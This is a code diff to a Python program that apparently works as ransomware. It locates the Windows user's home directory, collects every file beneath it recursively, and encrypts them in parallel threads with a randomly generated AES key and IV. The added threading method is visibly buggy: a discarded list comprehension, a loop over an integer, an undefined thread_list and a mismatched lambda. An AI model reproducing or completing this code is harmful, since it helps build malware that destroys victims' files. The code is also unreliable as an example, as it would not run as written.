@@ -4,18 +4,18 @@ import os
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from multiprocessing import cpu_count
-from concurrent.futures import ThreadPoolExecutor
 from os import path, getlogin, scandir
 from string import ascii_uppercase
+from threading import Thread
 
-MAIN_DRIVE = 'C:'
+MAIN_DRIVE = 'C:\\\\'
 WINDOWS_USERS_DIR = 'Users'
 
 
 class Crypto():
     def __init__(self, key_size, iv_size):
         self.num_threads = cpu_count()
-        self.pool = ThreadPoolExecutor(max_workers=1)
+        self.thread_list = []
         self.home_directory = self._get_home_dir()
         key = os.urandom(key_size)
         iv = os.urandom(iv_size)
@@ -28,7 +28,21 @@ class Crypto():
         return home_dir
 
     def get_files(self):
-        return glob.glob(path.join(self.home_directory, './**/'), recursive=True)
+        return glob.glob(self.home_directory + '\\**\\', recursive=True)
+
+    def encrypt_file_list(self, file_list):
+        chunks = self.num_threads
+        [file_list[i * chunks:(i + 1) * chunks]
+         for i in range((len(file_list) + chunks - 1) // chunks)]
+        for chunk in chunks:
+            thread = Thread(target=lambda x: [
+                            self.encrypt_file(f) for f in chunk])
+            thread_list.append(thread)
+            thread.start()
+
+        for thread in self.thread_list:
+            thread.join()
+            thread_list.remove(thread)
 
     def encrypt_file(self, filename):
         encryptor = self.cipher.encryptor()
